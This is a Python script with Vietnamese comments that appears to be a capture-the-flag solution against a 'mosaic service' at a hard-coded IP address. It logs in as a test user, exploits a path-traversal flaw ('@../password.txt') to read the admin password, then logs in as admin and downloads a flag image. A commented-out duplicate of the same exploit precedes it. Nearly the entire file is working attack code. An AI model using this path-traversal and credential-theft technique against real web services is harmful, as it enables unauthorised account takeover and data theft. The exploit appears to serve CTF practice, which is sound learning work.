# import requests

# url = 'http://58.229.185.52:9999'

# # Tạo một phiên làm việc để lưu cookie
# s = requests.Session()
# password = ''

# # Đăng nhập và lưu cookie vào phiên làm việc
# login_data = {"username": "test12", "password": "test12"}
# response = s.post(url + "/login", data=login_data)
# print(response.text)

# # Kiểm tra xem đăng nhập có thành công hay không
# if "Welcome to my mosaic service!!" in response.text:
#     print("Login successful")

#     # Tiếp tục sử dụng phiên làm việc để gửi yêu cầu với cookie đã lưu
#     r = s.get(url + '/check_upload/@../password.txt')

#     # Kiểm tra xem yêu cầu đã thành công hay không
#     if r.status_code == 200:
#         password = r.text
#         print("Password:", password)
#     else:
#         print("Failed to retrieve the password")
# else:
#     print("Login failed")

# # Đăng nhập vào tài khoản "admin" bằng mật khẩu đã lấy được
# login_admin = {"username": "admin", "password": password}
# s1 = requests.Session()
# r1 = s1.post(url + '/login', data=login_admin)

# # # Kiểm tra xem đăng nhập cho "admin" có thành công hay không
# # if "Welcome to my mosaic service!!" in r1.text:
# #     print("Admin login successful")

# #     # Lấy hình ảnh từ yêu cầu cuối cùng
# #     r2 = s1.get(url + '/check_upload/@admin/flag.png')

# #     # Kiểm tra xem yêu cầu đã thành công hay không
# #     if r2.status_code == 200:
# #         # Lưu hình ảnh vào một tệp (ví dụ: 'flag.png')
# #         with open('flag.png', 'wb') as f:
# #             f.write(r2.content)
# #         print("Flag image downloaded successfully")
# #     else:
# #         print("Failed to retrieve the flag image")
# # else:
# #     print("Admin login failed")
import requests

url = 'http://58.229.185.52:9999'

# Tạo một phiên làm việc để lưu cookie
s = requests.Session()
password = ''
# Đăng nhập và lưu cookie vào phiên làm việc
login_data = {"username": "test12", "password": "test12"}
response = s.post(url + "/login", data=login_data)
print(response.text)
# Kiểm tra xem đăng nhập có thành công hay không
if "Welcome to my mosiac service!!" in response.text:
    print("Login successful")

    # Tiếp tục sử dụng phiên làm việc để gửi yêu cầu với cookie đã lưu
    r = s.get(url + '/check_upload/@../password.txt')

    # Kiểm tra xem yêu cầu đã thành công hay không
    if r.status_code == 200:
        password = r.text
        print("Password:", password)
    else:
        print("Failed to retrieve the password")
else:
    print("Login failed")
login_admin = {"username": "admin", "password": password}
s1 = requests.Session()
r1 = s1.post(url + '/login', data = login_admin)
if "Welcome to my mosiac service!!" in response.text:
    print("Login successful")
    r2 = s1.get(url + '/check_upload/@admin/flag.png')
    with open("flag.png", "wb") as f:
        f.write(r2.content)